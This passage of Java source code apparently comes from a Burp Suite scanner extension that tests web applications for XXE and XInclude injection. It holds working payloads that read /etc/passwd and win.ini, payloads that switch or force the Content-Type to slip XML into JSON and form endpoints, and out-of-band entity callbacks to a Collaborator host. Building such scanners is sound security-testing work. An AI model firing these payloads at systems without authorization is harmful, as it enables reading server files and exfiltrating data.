                if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                        && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via HTML-Encoded Parameter Entity Bypass: win.ini read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (encoded &#x25;)")
                            .evidence("HTML-encoded &#x25; parameter entity bypass — win.ini content returned")
                            .description("XXE injection confirmed using HTML entity encoding of % on a Windows "
                                    + "target. Remediation: Disable DTD processing entirely.")
                            .payload(encodedWinEntity)
                            .responseEvidence("[fonts]")
                            .requestResponse(result5)
                            .build());
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 2: XINCLUDE INJECTION ====================

    /**
     * Tests XInclude injection in individual parameters. This targets scenarios where
     * user input is embedded into server-side XML documents. The parameters themselves
     * may not be XML, but the server inserts them into an XML context.
     */
    private void testXInclude(HttpRequestResponse original, XxeTarget target,
                               String url) throws InterruptedException {

        // Get baseline for comparison
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = (baseline != null && baseline.response() != null)
                ? baseline.response().bodyToString() : "";

        // XInclude payload targeting /etc/passwd (Linux)
        String xincludePasswd = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///etc/passwd\"/>";
        HttpRequestResponse passwdResult = sendPayload(original, target, xincludePasswd);
        if (passwdResult != null && passwdResult.response() != null) {
            String body = passwdResult.response().bodyToString();
            if (body != null
                    && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                    && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE via XInclude: /etc/passwd read",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("XInclude payload returned /etc/passwd content (root:x:0:0: found)")
                        .description("XInclude injection confirmed in parameter '" + target.name + "'. "
                                + "The server embeds user input into XML and processes XInclude directives. "
                                + "The /etc/passwd file was successfully read. "
                                + "Remediation: Disable XInclude processing in the XML parser, "
                                + "or sanitize input before embedding it into XML.")
                        .payload(xincludePasswd)
                        .responseEvidence("root:x:0:0:")
                        .requestResponse(passwdResult)
                        .build());
                return;
            }
        }

        perHostDelay();

        // XInclude payload targeting win.ini (Windows)
        String xincludeWinIni = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///C:/Windows/win.ini\"/>";
        HttpRequestResponse winIniResult = sendPayload(original, target, xincludeWinIni);
        if (winIniResult != null && winIniResult.response() != null) {
            String body = winIniResult.response().bodyToString();
            if (body != null
                    && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                    && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE via XInclude: win.ini read",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("XInclude payload returned win.ini content ([fonts] found)")
                        .description("XInclude injection confirmed in parameter '" + target.name + "'. "
                                + "The server embeds user input into XML and processes XInclude directives. "
                                + "The Windows win.ini file was successfully read. "
                                + "Remediation: Disable XInclude processing in the XML parser.")
                        .payload(xincludeWinIni)
                        .responseEvidence("[fonts]")
                        .requestResponse(winIniResult)
                        .build());
                return;
            }
        }

        perHostDelay();

        // XInclude OOB via Collaborator (blind XInclude)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentXIncludeOob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, target.name, "XInclude OOB callback",
                    interaction -> {
                        oobConfirmedParams.add(target.name);
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via XInclude Confirmed (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("XInclude OOB | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp()
                                        + " at " + interaction.timeStamp())
                                .description("Blind XInclude injection confirmed via Burp Collaborator. "
                                        + "The server processed an XInclude directive in parameter '"
                                        + target.name + "' and made an outbound request. "
                                        + "Remediation: Disable XInclude processing in the XML parser.")
                                .payload("XInclude OOB callback")
                                .requestResponse(sentXIncludeOob.get())
                                .build());
                        api.logging().logToOutput("[XXE XInclude OOB] Confirmed at " + url
                                + " param=" + target.name);
                    });
            if (collabPayload != null) {
                String xincludeOob = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                        + "href=\"http://" + collabPayload + "/xinclude\"/>";
                HttpRequestResponse xincludeOobResult = sendPayload(original, target, xincludeOob);
                sentXIncludeOob.set(xincludeOobResult);
                perHostDelay();
            }
        }

        // XInclude with fallback (some parsers require a fallback element)
        String xincludeFallback = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///etc/passwd\">"
                + "<xi:fallback>XINCLUDE_FALLBACK</xi:fallback>"
                + "</xi:include>";
        HttpRequestResponse fallbackResult = sendPayload(original, target, xincludeFallback);
        if (fallbackResult != null && fallbackResult.response() != null) {
            String body = fallbackResult.response().bodyToString();
            if (body != null) {
                // If we see the file content, confirmed
                if (LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via XInclude (with fallback): /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("XInclude with fallback returned /etc/passwd content")
                            .description("XInclude injection confirmed with fallback element. "
                                    + "Remediation: Disable XInclude processing.")
                            .payload(xincludeFallback)
                            .responseEvidence("root:x:0:0:")
                            .requestResponse(fallbackResult)
                            .build());
                    return;
                }
                // If we see the fallback text, the parser processed XInclude but couldn't read the file
                if (body.contains("XINCLUDE_FALLBACK") && !baselineBody.contains("XINCLUDE_FALLBACK")) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XInclude processing detected (fallback triggered)",
                                    Severity.MEDIUM, Confidence.TENTATIVE)
                            .url(url).parameter(target.name)
                            .evidence("XInclude fallback element content appeared in response")
                            .description("The server processes XInclude directives in parameter '"
                                    + target.name + "'. The file read failed (access denied or wrong OS), "
                                    + "but the fallback was rendered, confirming XInclude support. "
                                    + "Remediation: Disable XInclude processing.")
                            .payload(xincludeFallback)
                            .responseEvidence("XINCLUDE_FALLBACK")
                            .requestResponse(fallbackResult)
                            .build());
                }
            }
        }

        perHostDelay();
    }

    // ==================== PHASE 3: CONTENT-TYPE CONVERSION (JSON -> XML) ====================

    /**
     * Tests whether a JSON endpoint also accepts XML by converting the JSON body to XML
     * and changing the Content-Type header. If the server accepts XML, XXE payloads are tested.
     */
    private void testContentTypeConversion(HttpRequestResponse original, String url) throws InterruptedException {
        String jsonBody = original.request().bodyToString();
        if (jsonBody == null || jsonBody.trim().isEmpty()) return;

        // Convert JSON to XML
        String xmlBody = convertJsonToXml(jsonBody);
        if (xmlBody == null) return;

        // Try sending the XML body with application/xml content type
        String[] xmlContentTypes = {"application/xml", "text/xml"};

        for (String xmlCt : xmlContentTypes) {
            HttpRequest xmlRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", xmlCt)
                    .withBody(xmlBody);

            HttpRequestResponse xmlResult = null;
            try {
                xmlResult = api.http().sendRequest(xmlRequest);
            } catch (Exception e) {
                continue;
            }
            if (xmlResult == null || xmlResult.response() == null) continue;

            int xmlStatus = xmlResult.response().statusCode();
            String xmlResponseBody = xmlResult.response().bodyToString();

            // If the server returned a 2xx or 4xx (not 415 Unsupported Media Type),
            // the server may accept XML. Check for XML processing indicators.
            if (xmlStatus != 415 && xmlStatus < 500) {
                // Server accepted the XML Content-Type. Now try XXE payloads.
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "Content-Type conversion accepted: JSON to XML",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter("Content-Type")
                        .evidence("Original Content-Type: application/json | Converted to: " + xmlCt
                                + " | Response status: " + xmlStatus)
                        .description("The server accepted an XML Content-Type where JSON was expected. "
                                + "This expands the attack surface to include XXE injection. "
                                + "Remediation: Enforce strict Content-Type validation on the server.")
                        .payload(xmlBody)
                        .requestResponse(xmlResult)
                        .build());

                // Now test XXE file read via the converted body
                testConvertedXxePayloads(original, url, xmlBody, xmlCt, xmlResponseBody);
                break; // One accepted content type is enough
            }

            perHostDelay();
        }
    }

    /**
     * Tests XXE payloads against a JSON endpoint that accepted XML content type.
     */
    private void testConvertedXxePayloads(HttpRequestResponse original, String url,
                                           String xmlBody, String contentType,
                                           String baselineBody) throws InterruptedException {

        // Classic file read: /etc/passwd
        if (config.getBool("xxe.classic.enabled", true)) {
            String entityName = "xxeconv";
            String xxeDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file:///etc/passwd\">\n"
                    + "]>\n";
            String xxePayloadBody = xxeDtd + injectEntityReferenceIntoFirstElement(xmlBody, "&" + entityName + ";");

            HttpRequest xxeRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", contentType)
                    .withBody(xxePayloadBody);

            try {
                HttpRequestResponse result = api.http().sendRequest(xxeRequest);
                if (result != null && result.response() != null) {
                    String body = result.response().bodyToString();
                    if (body != null
                            && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion: /etc/passwd read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON endpoint accepted XML; XXE payload read /etc/passwd")
                                .description("XXE injection confirmed via Content-Type conversion. "
                                        + "The JSON endpoint also accepts XML and processes external entities. "
                                        + "/etc/passwd content was returned. "
                                        + "Remediation: Enforce strict Content-Type validation and disable "
                                        + "external entity processing.")
                                .payload(xxePayloadBody)
                                .responseEvidence("root:x:0:0:")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();

            // Also test Windows file
            String winIniDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "]>\n";
            String winIniPayload = winIniDtd + injectEntityReferenceIntoFirstElement(xmlBody, "&" + entityName + ";");

            HttpRequest winIniRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", contentType)
                    .withBody(winIniPayload);

            try {
                HttpRequestResponse winIniResult = api.http().sendRequest(winIniRequest);
                if (winIniResult != null && winIniResult.response() != null) {
                    String body = winIniResult.response().bodyToString();
                    if (body != null
                            && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion: win.ini read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON endpoint accepted XML; XXE payload read win.ini")
                                .description("XXE injection confirmed via Content-Type conversion. "
                                        + "The JSON endpoint also accepts XML. win.ini content was returned.")
                                .payload(winIniPayload)
                                .responseEvidence("[fonts]")
                                .requestResponse(winIniResult)
                                .build());
                        return;
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();
        }

        // OOB via Collaborator on converted endpoint
        if (config.getBool("xxe.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentCtConvertOob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "Content-Type conversion",
                    "XXE OOB via Content-Type conversion",
                    interaction -> {
                        oobConfirmedParams.add("Content-Type conversion");
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion Confirmed (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON-to-XML conversion + OOB | Collaborator "
                                        + interaction.type().name() + " interaction from "
                                        + interaction.clientIp())
                                .description("XXE confirmed on a JSON endpoint via Content-Type conversion. "
                                        + "The server accepted XML where JSON was expected and processed "
                                        + "external entities, triggering an OOB callback. "
                                        + "Remediation: Enforce Content-Type validation and disable external entities.")
                                .payload("Content-Type conversion OOB")
                                .requestResponse(sentCtConvertOob.get())
                                .build());
                        api.logging().logToOutput("[XXE CT-Convert OOB] Confirmed at " + url);
                    });
            if (collabPayload != null) {
                String oobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE root [\n"
                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload + "/xxe\">\n"
                        + "  %xxe;\n"
                        + "]>\n";
                String oobPayload = oobDtd + xmlBody;

                HttpRequest oobRequest = original.request()
                        .withRemovedHeader("Content-Type")
                        .withAddedHeader("Content-Type", contentType)
                        .withBody(oobPayload);
                try {
                    HttpRequestResponse ctOobResult = api.http().sendRequest(oobRequest);
                    sentCtConvertOob.set(ctOobResult);
                } catch (Exception ignored) {}
            }

            perHostDelay();
        }
    }

    // ==================== PHASE 4: CONTENT-TYPE FORCING ====================

    /**
     * Tests if a non-XML endpoint accepts XML by forcing the Content-Type to application/xml.
     * Targets form-urlencoded, multipart, and other non-XML/non-JSON requests.
     *
     * Strategy:
     * 1. Send a minimal XML probe with the forced Content-Type.
     *    If server returns 415 (Unsupported Media Type), stop — it rejects XML.
     * 2. If accepted, send a basic internal entity expansion probe to confirm XML parsing.
     * 3. If XML parsing confirmed, run classic file read + OOB payloads.
     */
    private void testContentTypeForcing(HttpRequestResponse original, String url,
                                         TargetFingerprint fingerprint) throws InterruptedException {

        // Step 1: Probe with a minimal XML body to see if the server accepts it
        String probeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<root>test</root>";
        String[] xmlContentTypes = {"application/xml", "text/xml"};
        String acceptedCt = null;
        HttpRequestResponse probeResult = null;

        for (String ct : xmlContentTypes) {
            HttpRequest probeRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", ct)
                    .withBody(probeXml);

            try {
                probeResult = api.http().sendRequest(probeRequest);
            } catch (Exception e) {
                continue;
            }
            if (probeResult == null || probeResult.response() == null) continue;

            int status = probeResult.response().statusCode();
            // 415 = server explicitly rejects XML. 5xx with XML-specific error also means rejection.
            if (status == 415) continue;
            if (status >= 500) continue;

            // Server didn't reject XML — worth probing further
            acceptedCt = ct;
            break;
        }

        if (acceptedCt == null) return; // Server rejects XML

        perHostDelay();

        // Step 2: Entity expansion probe — confirm the server actually parses XML entities
        String entityProbeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE root [\n"
                + "  <!ENTITY xxeprobe \"XXE_FORCE_PROBE_OK\">\n"
                + "]>\n"
                + "<root>&xxeprobe;</root>";

        HttpRequest entityProbeRequest = original.request()
                .withRemovedHeader("Content-Type")
                .withAddedHeader("Content-Type", acceptedCt)
                .withBody(entityProbeXml);

        HttpRequestResponse entityResult = null;
        boolean entityExpansionConfirmed = false;
        boolean xmlProcessingLikely = false;
        String probeResponseBody = "";

        try {
            entityResult = api.http().sendRequest(entityProbeRequest);
        } catch (Exception e) {
            return;
        }

        if (entityResult != null && entityResult.response() != null) {
            probeResponseBody = entityResult.response().bodyToString();
            if (probeResponseBody != null && probeResponseBody.contains("XXE_FORCE_PROBE_OK")) {
                entityExpansionConfirmed = true;
            }
            // Even without entity expansion, XML processing errors indicate the server tried to parse
            if (probeResponseBody != null && XML_PARSER_ERROR_PATTERN.matcher(probeResponseBody).find()) {
                xmlProcessingLikely = true;
            }
        }

        if (!entityExpansionConfirmed && !xmlProcessingLikely) {
            // Server accepted the Content-Type but doesn't appear to parse XML — stop here
            return;
        }

        // Report the Content-Type forcing acceptance
        findingsStore.addFinding(Finding.builder("xxe-scanner",
                        "Content-Type forcing accepted: non-XML endpoint parses XML",
                        entityExpansionConfirmed ? Severity.HIGH : Severity.MEDIUM,
                        entityExpansionConfirmed ? Confidence.CERTAIN : Confidence.FIRM)
                .url(url).parameter("Content-Type")
                .evidence("Original Content-Type: " + getContentType(original.request())
                        + " | Forced to: " + acceptedCt
                        + " | Entity expansion: " + (entityExpansionConfirmed ? "YES" : "no")
                        + " | XML processing: " + (xmlProcessingLikely ? "YES" : "unknown"))
                .description("The server accepted a forced XML Content-Type on an endpoint that normally "
                        + "receives " + getContentType(original.request()) + ". "
                        + (entityExpansionConfirmed
                            ? "Entity expansion is confirmed — the XML parser processes DTD entities. "
                            : "XML parser errors were detected, indicating the server processes XML. ")
                        + "This widens the attack surface to XXE injection. "
                        + "Remediation: Enforce strict Content-Type validation and reject unexpected types.")
                .payload(entityProbeXml)
                .responseEvidence(entityExpansionConfirmed ? "XXE_FORCE_PROBE_OK" : "")
                .requestResponse(entityResult)
                .build());

        perHostDelay();

        // Step 3: Run XXE payloads through the forced Content-Type
        String baselineBody = probeResponseBody;

        // 3a: Classic file read (only on reflective endpoints where entity expansion works)
        if (entityExpansionConfirmed && config.getBool("xxe.classic.enabled", true)) {
            // Linux /etc/passwd
            String passwdDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                    + "]>\n"
                    + "<root>&xxe;</root>";

            HttpRequest passwdRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", acceptedCt)
                    .withBody(passwdDtd);

            try {
                HttpRequestResponse passwdResult = api.http().sendRequest(passwdRequest);
                if (passwdResult != null && passwdResult.response() != null) {
                    String body = passwdResult.response().bodyToString();
                    if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Forcing: /etc/passwd read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type forcing")
                                .evidence("Forced XML Content-Type; XXE payload read /etc/passwd")
                                .description("XXE injection confirmed via Content-Type forcing. "
                                        + "The non-XML endpoint accepted XML and processed external entities. "
                                        + "/etc/passwd content was returned.")
                                .payload(passwdDtd)
                                .responseEvidence("root:x:0:0:")
                                .requestResponse(passwdResult)
                                .build());
                        return; // Confirmed — no need for more payloads
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();

            // Windows win.ini
            String winIniDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "]>\n"
                    + "<root>&xxe;</root>";

            HttpRequest winIniRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", acceptedCt)
                    .withBody(winIniDtd);

            try {
                HttpRequestResponse winIniResult = api.http().sendRequest(winIniRequest);
                if (winIniResult != null && winIniResult.response() != null) {
                    String body = winIniResult.response().bodyToString();
                    if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Forcing: win.ini read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type forcing")
                                .evidence("Forced XML Content-Type; XXE payload read win.ini")
                                .description("XXE injection confirmed via Content-Type forcing. "
                                        + "The non-XML endpoint accepted XML. win.ini content was returned.")
                                .payload(winIniDtd)
                                .responseEvidence("[fonts]")
                                .requestResponse(winIniResult)
                                .build());
                        return;
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();
        }

        // 3b: Blind XXE via OOB (Collaborator) — works even without entity reflection
        if (config.getBool("xxe.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {

            // Parameter entity OOB
            final String finalAcceptedCt = acceptedCt;
            AtomicReference<HttpRequestResponse> sentForceOob1 = new AtomicReference<>();
            String collabPayload1 = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "Content-Type forcing",
                    "XXE OOB via Content-Type forcing (parameter entity)",
                    interaction -> {
                        oobConfirmedParams.add("Content-Type forcing");
                        reportOobFinding(interaction, url,
                                "Content-Type forcing parameter entity OOB", sentForceOob1.get());
                    });
            if (collabPayload1 != null) {
                String oobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE root [\n"
                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload1 + "/xxe\">\n"
                        + "  %xxe;\n"
                        + "]>\n"
                        + "<root>test</root>";

                HttpRequest oobRequest = original.request()
                        .withRemovedHeader("Content-Type")
                        .withAddedHeader("Content-Type", finalAcceptedCt)
                        .withBody(oobDtd);
                try {
                    HttpRequestResponse oobResult = api.http().sendRequest(oobRequest);
                    sentForceOob1.set(oobResult);
                } catch (Exception ignored) {}

                perHostDelay();
            }

            // Direct entity OOB
            AtomicReference<HttpRequestResponse> sentForceOob2 = new AtomicReference<>();
            String collabPayload2 = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "Content-Type forcing",
                    "XXE OOB via Content-Type forcing (direct entity)",
                    interaction -> {
                        oobConfirmedParams.add("Content-Type forcing");
                        reportOobFinding(interaction, url,
                                "Content-Type forcing direct entity OOB", sentForceOob2.get());
                    });
            if (collabPayload2 != null) {
                String directOobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE root [\n"
                        + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload2 + "/xxe\">\n"
                        + "]>\n"
                        + "<root>&xxe;</root>";

                HttpRequest directOobRequest = original.request()
                        .withRemovedHeader("Content-Type")
                        .withAddedHeader("Content-Type", finalAcceptedCt)
                        .withBody(directOobDtd);
                try {
                    HttpRequestResponse directOobResult = api.http().sendRequest(directOobRequest);
                    sentForceOob2.set(directOobResult);
                } catch (Exception ignored) {}

                perHostDelay();
            }
        }
    }

    // ==================== HELPER METHODS ====================

    /**
     * Sends the original request with a replaced body. Preserves all headers including Content-Type.
     */
    private HttpRequestResponse sendRawRequest(HttpRequestResponse original, String newBody) {
        try {
            HttpRequest modified = original.request().withBody(newBody);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Sends a payload by injecting it into the target parameter (for XInclude testing).
     */
    private HttpRequestResponse sendPayload(HttpRequestResponse original, XxeTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Injects a payload into a parameter based on target type.
     */
    private HttpRequest injectPayload(HttpRequest request, XxeTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                // For dot-notation keys (nested JSON), use the leaf key name for matching
                String matchKey = target.name.contains(".") ? target.name : target.name;
                String jsonPattern = "\"" + java.util.regex.Pattern.quote(matchKey)
                        + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + matchKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(jsonPattern, replacement));
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Injects a DTD prologue into an existing XML body. Handles cases where the body
     * already has an XML declaration and/or an existing DOCTYPE.
     *
     * @param originalXml The original XML body
     * @param dtd         The DTD to inject (e.g., "<!DOCTYPE foo [...]>")
     * @param entityRef   An entity reference to inject into the body content (e.g., "&xxe;"),
     *                    or empty string if not needed
     * @return The modified XML body with the DTD injected
     */
    private String injectDtdIntoXml(String originalXml, String dtd, String entityRef) {
        String result = originalXml;

        // Remove any existing DOCTYPE declaration to avoid conflicts
        result = result.replaceAll("<!DOCTYPE[^>]*>", "");
        result = result.replaceAll("<!DOCTYPE[^\\[]*\\[[^\\]]*\\]\\s*>", "");

        // Remove the XML declaration if present; we will re-add it in the DTD
        String xmlDecl = "";
        Pattern xmlDeclPattern = Pattern.compile("<\\?xml[^?]*\\?>");
        Matcher m = xmlDeclPattern.matcher(result);
        if (m.find()) {
            xmlDecl = m.group();
            result = m.replaceFirst("");
        }

        result = result.trim();

        // Construct: [xml declaration] + [dtd] + [body with optional entity reference]
        StringBuilder sb = new StringBuilder();
        if (!xmlDecl.isEmpty()) {
            sb.append(xmlDecl).append("\n");
        }
        sb.append(dtd);

        // If an entity reference is needed, inject it into the first text content of the XML
        if (!entityRef.isEmpty()) {
            result = injectEntityReferenceIntoFirstElement(result, entityRef);
        }

        sb.append(result);
        return sb.toString();
    }

    /**
     * Injects an entity reference into the first element's text content in the XML.
     * For example, turns "<root><name>John</name></root>" into "<root><name>&xxe;John</name></root>".
     * If no suitable element is found, appends the entity reference after the first opening tag.
     */
    private String injectEntityReferenceIntoFirstElement(String xml, String entityRef) {
        // Try to find the first opening tag and inject the entity reference after it
        Pattern firstElementPattern = Pattern.compile("(<[a-zA-Z][^>]*>)([^<]*)");
        Matcher matcher = firstElementPattern.matcher(xml);
        if (matcher.find()) {
            int insertPos = matcher.start(2);
            return xml.substring(0, insertPos) + entityRef + xml.substring(insertPos);
        }
        // Fallback: just prepend
        return entityRef + xml;
    }

    /**
     * Injects an entity reference into the first text node of a SOAP body element.
     */
    private String injectEntityReferenceIntoSoap(String soapXml, String entityRef) {
        // Try to find SOAP Body content and inject entity reference there
        Pattern soapBodyContentPattern = Pattern.compile(
                "(<(?:soap|SOAP-ENV|soapenv):Body[^>]*>\\s*<[^>]+>)([^<]*)",
                Pattern.CASE_INSENSITIVE);
        Matcher m = soapBodyContentPattern.matcher(soapXml);
        if (m.find()) {
            int insertPos = m.start(2);
            return soapXml.substring(0, insertPos) + entityRef + soapXml.substring(insertPos);
        }
        // Fallback: try general injection
        return injectEntityReferenceIntoFirstElement(soapXml, entityRef);
    }

    /**
     * Converts a simple JSON object to a basic XML representation.
     * Handles flat JSON objects (nested objects are serialized as string values).
     *
     * @param json The JSON string to convert
     * @return An XML representation, or null if conversion fails
     */
    private String convertJsonToXml(String json) {
        try {
            com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(json);
            if (!el.isJsonObject()) return null;

            com.google.gson.JsonObject obj = el.getAsJsonObject();
            StringBuilder xml = new StringBuilder();
            xml.append("<root>");

            for (String key : obj.keySet()) {
                // Sanitize key for XML element name (replace invalid chars)
                String safeKey = key.replaceAll("[^a-zA-Z0-9_.-]", "_");
                if (safeKey.isEmpty() || Character.isDigit(safeKey.charAt(0))) {
                    safeKey = "item_" + safeKey;
                }

                com.google.gson.JsonElement val = obj.get(key);
                String textValue;
                if (val.isJsonPrimitive()) {
                    textValue = xmlEscape(val.getAsString());
                } else if (val.isJsonNull()) {
                    textValue = "";
                } else {
                    textValue = xmlEscape(val.toString());
                }
                xml.append("<").append(safeKey).append(">")
                        .append(textValue)
                        .append("</").append(safeKey).append(">");
            }

            xml.append("</root>");
            return xml.toString();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Escapes special XML characters in text content.
     */
    private String xmlEscape(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&apos;");
    }

    /**
     * Extracts parameter injection targets from the request for XInclude testing.
     */
    private List<XxeTarget> extractParameterTargets(HttpRequest request) {
        List<XxeTarget> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.COOKIE));
                    break;
            }
        }

        // Header injection targets for XInclude
        String[] headerTargets = {"User-Agent", "Referer", "SOAPAction", "Content-Type", "X-Forwarded-For"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new XxeTarget(headerName, h.value(), XxeTargetType.HEADER));
                    break;
                }
            }
        }

        // JSON body parameters (with recursive nested JSON traversal)
        String ct = getContentType(request);
        if (ct != null && ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonTargetsRecursive(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        return targets;
    }

    /**
